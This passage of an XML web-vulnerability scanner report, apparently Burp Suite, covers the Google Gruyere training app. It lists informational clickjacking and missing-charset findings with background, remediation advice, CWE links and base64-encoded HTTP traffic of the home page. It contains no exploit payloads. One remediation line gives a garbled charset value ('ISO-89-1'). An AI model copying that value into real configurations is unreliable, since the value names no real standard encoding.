      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvIEhUVFAvMS4xDQpIb3N0OiBnb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpBY2NlcHQ6ICovKg0KQWNjZXB0LUxhbmd1YWdlOiBlbg0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE1TSUUgOS4wOyBXaW5kb3dzIE5UIDYuMTsgV2luNjQ7IHg2NDsgVHJpZGVudC81LjApDQpDb25uZWN0aW9uOiBjbG9zZQ0KUmVmZXJlcjogaHR0cDovL2dvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNg0KQ29va2llOiBHUlVZRVJFX0lEPTQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNg0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogYTI5NjA5ZjBlNDM3MzNkNWNkODYxZTBhYmY5OWE5M2INClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTozOTo0NyBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMzg4MQ0KQ29ubmVjdGlvbjogY2xvc2UNCg0KPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiI+CjwhLS0gQ29weXJpZ2h0IDIwMTcgR29vZ2xlIEluYy4gLS0+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkdydXllcmU6IEhvbWU8L3RpdGxlPgo8c3R5bGU+Ci8qIENvcHlyaWdodCAyMDE3IEdvb2dsZSBJbmMuICovCgpib2R5LCBodG1sLCB0ZCwgc3BhbiwgZGl2LCBpbnB1dCwgdGV4dGFyZWEgewogIGZvbnQtZmFtaWx5OiBzYW5zLXNlcmlmOwogIGZvbnQtc2l6ZTogMTRwdDsKfQoKYm9keSB7CiAgYmFja2dyb3VuZDogdXJsKCdjaGVlc2UucG5nJykgdG9wIGNlbnRlciByZXBlYXQ7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIG9wYWNpdHk6IDAuODA7Cn0KCmgyIHsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgZm9udC1zaXplOiAzMHB0OwogIGZvbnQtd2VpZ2h0OiBib2xkOwp9Cgp0ZCB7CiAgdmVydGljYWwtYWxpZ246IHRvcDsKICBwYWRkaW5nOiA1cHg7Cn0KCmEsIGE6aG92ZXIgewogIHRleHQtZGVjb3JhdGlvbjogdW5kZXJsaW5lOwogIGNvbG9yOiAjMDAwMGJiOwp9CgphOnZpc2l0ZWQgewogIGNvbG9yOiAjYmIwMDAwOwp9CgphLmJ1dHRvbjp2aXNpdGVkIHsKICBjb2xvcjogIzAwMDBiYjsKfQoKLmNvbnRlbnQgewogIHRleHQtYWxpZ246IGxlZnQ7CiAgbWFyZ2luLWxlZnQ6IGF1dG87CiAgbWFyZ2luLXJpZ2h0OiBhdXRvOwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBwYWRkaW5nOiAyMHB4OwogIGJvcmRlcjogM3B4IHNvbGlkICNmZmIxNDk7Cn0KCi5tZW51IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIHBhZGRpbmc6IDEwcHggMjBweCAzNXB4IDIwcHg7CiAgbWFyZ2luLWxlZnQ6IGF1dG87CiAgbWFyZ2luLXJpZ2h0OiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgd2lkdGg6IDkwJTsKICBiYWNrZ3JvdW5kOiAjZmZmZmNjOwogIGJvcmRlcjogM3B4IHNvbGlkICNmZmIxNDk7Cn0KCi5tZW51LXVzZXIgewogIGNvbG9yOiAjMDAwMDAwOwogIGZvbnQtd2VpZ2h0OiBib2xkOwp9CgojbWVudS1sZWZ0IHsKICBmbG9hdDogbGVmdDsKfQoKI21lbnUtbGVmdCBhLCAjbWVudS1sZWZ0IGE6aG92ZXIsICNtZW51LWxlZnQgYTp2aXNpdGVkIHsKICBjb2xvcjogIzAwMDAwMDsKfQoKI21lbnUtcmlnaHQgewogIGZsb2F0OiByaWdodDsKfQoKI21lbnUtcmlnaHQgYSwgI21lbnUtcmlnaHQgYTpob3ZlciwgI21lbnUtcmlnaHQgYTp2aXNpdGVkIHsKICBjb2xvcjogIzAwMDAwMDsKfQoKLm1lc3NhZ2UgewogIHdpZHRoOiA1MCU7CiAgY29sb3I6ICNmZjAwMDA7CiAgYmFja2dyb3VuZDogI2ZmZGRkZDsKICBib3JkZXI6IDJweCBzb2xpZCAjZmYwMDAwOwogIGJvcmRlci1yYWRpdXM6IDFlbTsKICAtbW96LWJvcmRlci1yYWRpdXM6IDFlbTsKICBwYWRkaW5nOiAxMHB4OwogIGZvbnQtd2VpZ2h0OiBib2xkOwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBtYXJnaW46IGF1dG87CiAgbWFyZ2luLXRvcDogMjBweDsKICBtYXJnaW4tYm90dG9tOiAyMHB4Owp9CgppbnB1dCwgdGV4dGFyZWEgewogIGJhY2tncm91bmQtY29sb3I6ICNmZmZmZmY7Cn0KCi5yZWZyZXNoIHsKICBmbG9hdDogY2VudGVyOwogIHdpZHRoOiA5MCU7CiAgdGV4dC1hbGlnbjogcmlnaHQ7CiAgbWFyZ2luOiBhdXRvOwogIHBhZGRpbmctdG9wOiAwOwogIHBhZGRpbmctYm90dG9tOiAycHQ7CiAgbWFyZ2luLXRvcDogMDsKICBtYXJnaW4tYm90dG9tOiAwOwp9CgouaDItd2l0aC1yZWZyZXNoIHsKICBtYXJnaW4tYm90dG9tOiAwOwp9Cgo8L3N0eWxlPgoKPHNjcmlwdCBzcmM9Ii80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbGliLmpzIiB0ZXh0PSJ0ZXh0L2phdmFzY3JpcHQiPgo8L3NjcmlwdD4KPC9oZWFkPgoKPGJvZHk+Cgo8ZGl2IGNsYXNzPSdtZW51Jz4KICA8c3BhbiBpZD0nbWVudS1sZWZ0Jz4KICAgIDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvJz5Ib21lPC9hPgogICAgICAKICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3NuaXBwZXRzLmd0bCc+TXkmbmJzcDtTbmlwcGV0czwvYT4KICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L25ld3NuaXBwZXQuZ3RsJz5OZXcmbmJzcDtTbmlwcGV0PC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvdXBsb2FkLmd0bCc+VXBsb2FkPC9hPgogICAgICAKICA8L3NwYW4+CiAgPHNwYW4gaWQ9J21lbnUtcmlnaHQnPgogICAgICAKICAgICAgPHNwYW4gY2xhc3M9J21lbnUtdXNlcic+CiAgICAgICAgNTU1LTU1NS0wMTk5QGV4YW1wbGUuY29tICZsdDs1NTUtNTU1LTAxOTlAZXhhbXBsZS5jb20mZ3Q7CiAgICAgIDwvc3Bhbj4KICAgICAgCiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9lZGl0cHJvZmlsZS5ndGwnPlByb2ZpbGU8L2E+CiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9sb2dvdXQnPlNpZ24gb3V0PC9hPgogICAgICAKICAgICAgCiAgPC9zcGFuPgo8L2Rpdj4KCjxkaXY+CjxoMiBjbGFzcz0naGFzLXJlZnJlc2gnPkdydXllcmU6IEhvbWU8L2gyPgo8ZGl2IGNsYXNzPSdyZWZyZXNoJz48YSBjbGFzcz0nYnV0dG9uJyBvbmNsaWNrPSdfcmVmcmVzaEhvbWUoIjQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNiIpJyBocmVmPScjJz5SZWZyZXNoPC9hPjwvZGl2Pgo8L2Rpdj4KPGRpdiBjbGFzcz0nY29udGVudCc+Cjx0YWJsZSB3aWR0aD0nMTAwJSc+CgogIDx0cj48dGQgY29sc3Bhbj0nMyc+PGI+TW9zdCByZWNlbnQgc25pcHBldHM6PC9iPjwvdGQ+PC90cj4KCgoKCiAgPHRyPgogICAgPHRkPgogICAgIAogICAgPC90ZD4KICAgIDx0ZD4KICAgICAgPGI+PHNwYW4gc3R5bGU9J2NvbG9yOmJsdWUnPkNoZWRkYXIgTWFjPC9zcGFuPjwvYj4KICAgIDwvdGQ+CiAgICA8dGQgd2lkdGg9JzEwMCUnPjxzcGFuIGlkPSdjaGVkZGFyJz5HcnV5ZXJlIGlzIHRoZSBjaGVlc2llc3QgYXBwbGljYXRpb24gb24gdGhlIHdlYi48L3NwYW4+CiAgICA8YnI+CiAgICAgICAgICA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3NuaXBwZXRzLmd0bD91aWQ9Y2hlZGRhcic+QWxsIHNuaXBwZXRzPC9hPiZuYnNwOwogICAgICA8YSBocmVmPSdodHRwczovL2ltYWdlcy5nb29nbGUuY29tLz9xPWNoZWRkYXIrY2hlZXNlJz5Ib21lcGFnZTwvYT4KICAgIDxicj4KICAgIDxicj4KICAgIDwvdGQ+CiAgPC90cj4KCgoKCgoKCiAgPHRyPgogICAgPHRkPgogICAgIAogICAgPC90ZD4KICAgIDx0ZD4KICAgICAgPGI+PHNwYW4gc3R5bGU9J2NvbG9yOnJlZDsgdGV4dC1kZWNvcmF0aW9uOnVuZGVybGluZSc+QnJpZTwvc3Bhbj48L2I+CiAgICA8L3RkPgogICAgPHRkIHdpZHRoPScxMDAlJz48c3BhbiBpZD0nYnJpZSc+QnJpZSBpcyB0aGUgcXVlZW4gb2YgdGhlIGNoZWVzZXM8c3BhbiBzdHlsZT1jb2xvcjpyZWQ+ISEhPC9zcGFuPjwvc3Bhbj4KICAgIDxicj4KICAgICAgICAgIDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvc25pcHBldHMuZ3RsP3VpZD1icmllJz5BbGwgc25pcHBldHM8L2E+Jm5ic3A7CiAgICAgIDxhIGhyZWY9J2h0dHBzOi8vbmV3cy5nb29nbGUuY29tL25ld3Mvc2VhcmNoP3E9YnJpZSc+SG9tZXBhZ2U8L2E+CiAgICA8YnI+CiAgICA8YnI+CiAgICA8L3RkPgogIDwvdHI+CgoKPC90YWJsZT4KPC9kaXY+CjwvYm9keT4KPC9odG1sPgo=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>1242977682879762432</serialNumber>
    <type>5245344</type>
    <name><![CDATA[Frameable response (potential Clickjacking)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/]]></location>
    <severity>Information</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p>
<p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using "framebusting" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p>
<p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options">X-Frame-Options</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/693.html">CWE-693: Protection Mechanism Failure</a></li>
</ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvIEhUVFAvMS4xDQpIb3N0OiBnb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpBY2NlcHQ6ICovKg0KQWNjZXB0LUxhbmd1YWdlOiBlbg0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE1TSUUgOS4wOyBXaW5kb3dzIE5UIDYuMTsgV2luNjQ7IHg2NDsgVHJpZGVudC81LjApDQpDb25uZWN0aW9uOiBjbG9zZQ0KUmVmZXJlcjogaHR0cDovL2dvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNg0KQ29va2llOiBHUlVZRVJFX0lEPTQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNg0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogYTI5NjA5ZjBlNDM3MzNkNWNkODYxZTBhYmY5OWE5M2INClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTozOTo0NyBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMzg4MQ0KQ29ubmVjdGlvbjogY2xvc2UNCg0KPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiI+CjwhLS0gQ29weXJpZ2h0IDIwMTcgR29vZ2xlIEluYy4gLS0+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkdydXllcmU6IEhvbWU8L3RpdGxlPgo8c3R5bGU+Ci8qIENvcHlyaWdodCAyMDE3IEdvb2dsZSBJbmMuICovCgpib2R5LCBodG1sLCB0ZCwgc3BhbiwgZGl2LCBpbnB1dCwgdGV4dGFyZWEgewogIGZvbnQtZmFtaWx5OiBzYW5zLXNlcmlmOwogIGZvbnQtc2l6ZTogMTRwdDsKfQoKYm9keSB7CiAgYmFja2dyb3VuZDogdXJsKCdjaGVlc2UucG5nJykgdG9wIGNlbnRlciByZXBlYXQ7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIG9wYWNpdHk6IDAuODA7Cn0KCmgyIHsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgZm9udC1zaXplOiAzMHB0OwogIGZvbnQtd2VpZ2h0OiBib2xkOwp9Cgp0ZCB7CiAgdmVydGljYWwtYWxpZ246IHRvcDsKICBwYWRkaW5nOiA1cHg7Cn0KCmEsIGE6aG92ZXIgewogIHRleHQtZGVjb3JhdGlvbjogdW5kZXJsaW5lOwogIGNvbG9yOiAjMDAwMGJiOwp9CgphOnZpc2l0ZWQgewogIGNvbG9yOiAjYmIwMDAwOwp9CgphLmJ1dHRvbjp2aXNpdGVkIHsKICBjb2xvcjogIzAwMDBiYjsKfQoKLmNvbnRlbnQgewogIHRleHQtYWxpZ246IGxlZnQ7CiAgbWFyZ2luLWxlZnQ6IGF1dG87CiAgbWFyZ2luLXJpZ2h0OiBhdXRvOwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBwYWRkaW5nOiAyMHB4OwogIGJvcmRlcjogM3B4IHNvbGlkICNmZmIxNDk7Cn0KCi5tZW51IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIHBhZGRpbmc6IDEwcHggMjBweCAzNXB4IDIwcHg7CiAgbWFyZ2luLWxlZnQ6IGF1dG87CiAgbWFyZ2luLXJpZ2h0OiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgd2lkdGg6IDkwJTsKICBiYWNrZ3JvdW5kOiAjZmZmZmNjOwogIGJvcmRlcjogM3B4IHNvbGlkICNmZmIxNDk7Cn0KCi5tZW51LXVzZXIgewogIGNvbG9yOiAjMDAwMDAwOwogIGZvbnQtd2VpZ2h0OiBib2xkOwp9CgojbWVudS1sZWZ0IHsKICBmbG9hdDogbGVmdDsKfQoKI21lbnUtbGVmdCBhLCAjbWVudS1sZWZ0IGE6aG92ZXIsICNtZW51LWxlZnQgYTp2aXNpdGVkIHsKICBjb2xvcjogIzAwMDAwMDsKfQoKI21lbnUtcmlnaHQgewogIGZsb2F0OiByaWdodDsKfQoKI21lbnUtcmlnaHQgYSwgI21lbnUtcmlnaHQgYTpob3ZlciwgI21lbnUtcmlnaHQgYTp2aXNpdGVkIHsKICBjb2xvcjogIzAwMDAwMDsKfQoKLm1lc3NhZ2UgewogIHdpZHRoOiA1MCU7CiAgY29sb3I6ICNmZjAwMDA7CiAgYmFja2dyb3VuZDogI2ZmZGRkZDsKICBib3JkZXI6IDJweCBzb2xpZCAjZmYwMDAwOwogIGJvcmRlci1yYWRpdXM6IDFlbTsKICAtbW96LWJvcmRlci1yYWRpdXM6IDFlbTsKICBwYWRkaW5nOiAxMHB4OwogIGZvbnQtd2VpZ2h0OiBib2xkOwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBtYXJnaW46IGF1dG87CiAgbWFyZ2luLXRvcDogMjBweDsKICBtYXJnaW4tYm90dG9tOiAyMHB4Owp9CgppbnB1dCwgdGV4dGFyZWEgewogIGJhY2tncm91bmQtY29sb3I6ICNmZmZmZmY7Cn0KCi5yZWZyZXNoIHsKICBmbG9hdDogY2VudGVyOwogIHdpZHRoOiA5MCU7CiAgdGV4dC1hbGlnbjogcmlnaHQ7CiAgbWFyZ2luOiBhdXRvOwogIHBhZGRpbmctdG9wOiAwOwogIHBhZGRpbmctYm90dG9tOiAycHQ7CiAgbWFyZ2luLXRvcDogMDsKICBtYXJnaW4tYm90dG9tOiAwOwp9CgouaDItd2l0aC1yZWZyZXNoIHsKICBtYXJnaW4tYm90dG9tOiAwOwp9Cgo8L3N0eWxlPgoKPHNjcmlwdCBzcmM9Ii80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbGliLmpzIiB0ZXh0PSJ0ZXh0L2phdmFzY3JpcHQiPgo8L3NjcmlwdD4KPC9oZWFkPgoKPGJvZHk+Cgo8ZGl2IGNsYXNzPSdtZW51Jz4KICA8c3BhbiBpZD0nbWVudS1sZWZ0Jz4KICAgIDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvJz5Ib21lPC9hPgogICAgICAKICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3NuaXBwZXRzLmd0bCc+TXkmbmJzcDtTbmlwcGV0czwvYT4KICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L25ld3NuaXBwZXQuZ3RsJz5OZXcmbmJzcDtTbmlwcGV0PC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvdXBsb2FkLmd0bCc+VXBsb2FkPC9hPgogICAgICAKICA8L3NwYW4+CiAgPHNwYW4gaWQ9J21lbnUtcmlnaHQnPgogICAgICAKICAgICAgPHNwYW4gY2xhc3M9J21lbnUtdXNlcic+CiAgICAgICAgNTU1LTU1NS0wMTk5QGV4YW1wbGUuY29tICZsdDs1NTUtNTU1LTAxOTlAZXhhbXBsZS5jb20mZ3Q7CiAgICAgIDwvc3Bhbj4KICAgICAgCiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9lZGl0cHJvZmlsZS5ndGwnPlByb2ZpbGU8L2E+CiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9sb2dvdXQnPlNpZ24gb3V0PC9hPgogICAgICAKICAgICAgCiAgPC9zcGFuPgo8L2Rpdj4KCjxkaXY+CjxoMiBjbGFzcz0naGFzLXJlZnJlc2gnPkdydXllcmU6IEhvbWU8L2gyPgo8ZGl2IGNsYXNzPSdyZWZyZXNoJz48YSBjbGFzcz0nYnV0dG9uJyBvbmNsaWNrPSdfcmVmcmVzaEhvbWUoIjQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNiIpJyBocmVmPScjJz5SZWZyZXNoPC9hPjwvZGl2Pgo8L2Rpdj4KPGRpdiBjbGFzcz0nY29udGVudCc+Cjx0YWJsZSB3aWR0aD0nMTAwJSc+CgogIDx0cj48dGQgY29sc3Bhbj0nMyc+PGI+TW9zdCByZWNlbnQgc25pcHBldHM6PC9iPjwvdGQ+PC90cj4KCgoKCiAgPHRyPgogICAgPHRkPgogICAgIAogICAgPC90ZD4KICAgIDx0ZD4KICAgICAgPGI+PHNwYW4gc3R5bGU9J2NvbG9yOmJsdWUnPkNoZWRkYXIgTWFjPC9zcGFuPjwvYj4KICAgIDwvdGQ+CiAgICA8dGQgd2lkdGg9JzEwMCUnPjxzcGFuIGlkPSdjaGVkZGFyJz5HcnV5ZXJlIGlzIHRoZSBjaGVlc2llc3QgYXBwbGljYXRpb24gb24gdGhlIHdlYi48L3NwYW4+CiAgICA8YnI+CiAgICAgICAgICA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3NuaXBwZXRzLmd0bD91aWQ9Y2hlZGRhcic+QWxsIHNuaXBwZXRzPC9hPiZuYnNwOwogICAgICA8YSBocmVmPSdodHRwczovL2ltYWdlcy5nb29nbGUuY29tLz9xPWNoZWRkYXIrY2hlZXNlJz5Ib21lcGFnZTwvYT4KICAgIDxicj4KICAgIDxicj4KICAgIDwvdGQ+CiAgPC90cj4KCgoKCgoKCiAgPHRyPgogICAgPHRkPgogICAgIAogICAgPC90ZD4KICAgIDx0ZD4KICAgICAgPGI+PHNwYW4gc3R5bGU9J2NvbG9yOnJlZDsgdGV4dC1kZWNvcmF0aW9uOnVuZGVybGluZSc+QnJpZTwvc3Bhbj48L2I+CiAgICA8L3RkPgogICAgPHRkIHdpZHRoPScxMDAlJz48c3BhbiBpZD0nYnJpZSc+QnJpZSBpcyB0aGUgcXVlZW4gb2YgdGhlIGNoZWVzZXM8c3BhbiBzdHlsZT1jb2xvcjpyZWQ+ISEhPC9zcGFuPjwvc3Bhbj4KICAgIDxicj4KICAgICAgICAgIDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvc25pcHBldHMuZ3RsP3VpZD1icmllJz5BbGwgc25pcHBldHM8L2E+Jm5ic3A7CiAgICAgIDxhIGhyZWY9J2h0dHBzOi8vbmV3cy5nb29nbGUuY29tL25ld3Mvc2VhcmNoP3E9YnJpZSc+SG9tZXBhZ2U8L2E+CiAgICA8YnI+CiAgICA8YnI+CiAgICA8L3RkPgogIDwvdHI+CgoKPC90YWJsZT4KPC9kaXY+CjwvYm9keT4KPC9odG1sPgo=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>2615023052109416448</serialNumber>
    <type>8389120</type>
    <name><![CDATA[HTML does not specify charset]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>If a  response states that it contains HTML content but does not specify a character set, then the browser may analyze the HTML and attempt to determine which character set it appears to be using. Even if the majority of the HTML actually employs a standard character set such as UTF-8, the presence of non-standard characters anywhere in the response may cause the browser to interpret the content using a different character set. This can have unexpected results, and can lead to cross-site scripting vulnerabilities in which non-standard encodings like UTF-7 can be used to bypass the application's defensive filters.</p>
<p>In most cases, the absence of a charset directive does not constitute a security flaw, particularly if the response contains static content. You should review the contents of affected responses, and the context in which they appear, to determine whether any vulnerability exists. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>For every response containing HTML content, the application should include within the Content-type header a directive specifying a standard recognized character set, for example <b>charset=ISO-89-1</b>.
</p>]]></remediationBackground>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/436.html">CWE-436: Interpretation Conflict</a></li>
</ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvIEhUVFAvMS4xDQpIb3N0OiBnb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpBY2NlcHQ6ICovKg0KQWNjZXB0LUxhbmd1YWdlOiBlbg0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE1TSUUgOS4wOyBXaW5kb3dzIE5UIDYuMTsgV2luNjQ7IHg2NDsgVHJpZGVudC81LjApDQpDb25uZWN0aW9uOiBjbG9zZQ0KUmVmZXJlcjogaHR0cDovL2dvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNg0KQ29va2llOiBHUlVZRVJFX0lEPTQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNg0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogYTI5NjA5ZjBlNDM3MzNkNWNkODYxZTBhYmY5OWE5M2INClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTozOTo0NyBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMzg4MQ0KQ29ubmVjdGlvbjogY2xvc2UNCg0KPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiI+CjwhLS0gQ29weXJpZ2h0IDIwMTcgR29vZ2xlIEluYy4gLS0+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkdydXllcmU6IEhvbWU8L3RpdGxlPgo8c3R5bGU+Ci8qIENvcHlyaWdodCAyMDE3IEdvb2dsZSBJbmMuICovCgpib2R5LCBodG1sLCB0ZCwgc3BhbiwgZGl2LCBpbnB1dCwgdGV4dGFyZWEgewogIGZvbnQtZmFtaWx5OiBzYW5zLXNlcmlmOwogIGZvbnQtc2l6ZTogMTRwdDsKfQoKYm9keSB7CiAgYmFja2dyb3VuZDogdXJsKCdjaGVlc2UucG5nJykgdG9wIGNlbnRlciByZXBlYXQ7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIG9wYWNpdHk6IDAuODA7Cn0KCmgyIHsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgZm9udC1zaXplOiAzMHB0OwogIGZvbnQtd2VpZ2h0OiBib2xkOwp9Cgp